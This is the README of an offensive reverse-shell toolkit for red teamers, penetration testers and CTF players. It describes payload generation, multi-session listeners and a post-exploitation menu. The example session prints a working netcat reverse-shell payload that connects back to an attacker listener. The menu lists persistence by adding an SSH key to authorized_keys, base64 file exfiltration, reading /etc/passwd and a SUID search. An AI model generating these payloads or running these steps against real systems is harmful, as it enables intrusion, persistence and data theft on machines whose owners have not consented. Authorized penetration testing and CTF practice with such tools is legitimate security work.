# Reverse Shell Toolkit

A modular, advanced reverse shell toolkit for red teamers, penetration testers, and CTFers. Generate payloads, catch multiple shells, automate post-exploitation, and more—all from a single, extensible Python framework.

---

## Features

- **Payload Generation**: Generate a wide variety of reverse shell payloads for Linux, Windows, and Mac from a JSON database.
- **Multi-Listener Support**: Listen on multiple IPs/ports simultaneously. Supports both TCP and HTTP listeners.
- **Automatic TTY Upgrade**: Automatically attempts to upgrade shells to fully interactive TTYs.
- **Command History**: Per-session command history with search and review.
- **Clipboard & Export**: Copy payloads to clipboard or export to file.
- **Payload Testing**: Check if a binary (e.g., `nc`, `python`) is available on your system before generating a payload.
- **Post-Exploitation Menu**: Automate common post-exploitation tasks (sudo check, SUID search, network info, SSH key drop, file exfiltration, etc.).
- **Session Management**: Handle multiple shells, switch between them, and log all activity.
- **Web Listener**: Catch web-based reverse shells via HTTP.

---

## Installation

1. **Clone the repository:**
   ```bash
   git clone https://github.com/yourusername/reverseshell-toolkit.git
   cd reverseshell-toolkit/sreverseshell
   ```
2. **(Optional) Create a virtual environment:**
   ```bash
   python3 -m venv venv
   source venv/bin/activate
   ```
3. **Install dependencies:**
   ```bash
   pip install pyperclip
   ```
   (Only needed for clipboard support)

---

## Usage

Run the main script:
```bash
python3 shell.py
```

### Workflow
1. **Select your local IP (supports VPNs):**
   - The script lists all detected IPs; pick the one you want to use for LHOST.
2. **Test for binaries:**
   - Optionally check if a binary (e.g., `nc`, `python`) is available.
3. **Select and generate a payload:**
   - Choose from a list of payloads. Customize LHOST, LPORT, and shell path.
   - Copy to clipboard or export to file as needed.
4. **Start a listener:**
   - Choose TCP (single or multi) or HTTP listener.
   - Listeners run until you press `Ctrl+C`.
5. **Interact with shells:**
   - Type commands as you would in a normal shell.
   - Use `!history` to view command history, `!search <term>` to search history.
   - Use `!post` to open the post-exploitation menu.
   - Use `!exit` to close a session.

---

## Post-Exploitation Menu
Type `!post` in any shell session to access:

- **Check sudo rights:** `sudo -l`
- **List /root files:** `ls -la /root/`
- **Show /etc/passwd:** `cat /etc/passwd`
- **Show network info:** `ip a`, `netstat -tulnp`
- **Find SUID binaries:** `find / -perm -4000 2>/dev/null`
- **Add SSH key:** Appends your public key to `~/.ssh/authorized_keys`
- **Exfiltrate a file:** Base64-encodes a file for easy copy-paste download

---

## Example

```
[*] Detected local IP addresses:
[0] 10.8.0.42
[1] 192.168.1.100
Select LHOST by number [0]: 0
[Payload Test] Check if a binary is available on your system.
Enter binary to test (e.g. nc, python, bash, leave blank to skip): nc
[+] nc is available!
Select payload:
[0] Bash -i (linux, mac)
[1] nc -e (linux, mac)
Choice: 1
Enter LHOST [10.8.0.42]:
Enter LPORT [4444]:
Shell to use (default: /bin/bash):
[+] Generated Payload:
nc 10.8.0.42 4444 -e /bin/bash
Copy payload to clipboard? (y/n): y
Export payload to file? (y/n): n
Listener options:
[1] TCP Listener (single or multi)
[2] Web Listener (HTTP)
Select listener type [1/2]: 1
Multi-listener mode? (y/n): n
Auto-reconnect on drop? (y/n): y
[*] Listening on 10.8.0.42:4444 ...
[+] Connection from 10.10.168.241:52986 (Session 1)
apache@target:/data/www/default$ !post
[Post-Exploitation Menu]
1. Check sudo rights (sudo -l)
2. List /root files (ls -la /root/)
3. Show network info (ip a, netstat -tulnp)
4. Find SUID binaries (find / -perm -4000 2>/dev/null)
5. Add SSH key to authorized_keys
6. Exfiltrate a file (base64)
7. Show /etc/passwd
0. Back to shell
Select option: 1
```

---

## Tips
- For a fully interactive shell, use the TTY upgrade (automated on connect).
- Use `Ctrl+C` to stop listeners.
- You can add more payloads by editing `revshell_payloads.json`.
- For clipboard support, install `pyperclip`.

---

## Disclaimer
This tool is for educational and authorized penetration testing use only. Do not use it on systems you do not own or have explicit permission to test.

---

## License
MIT
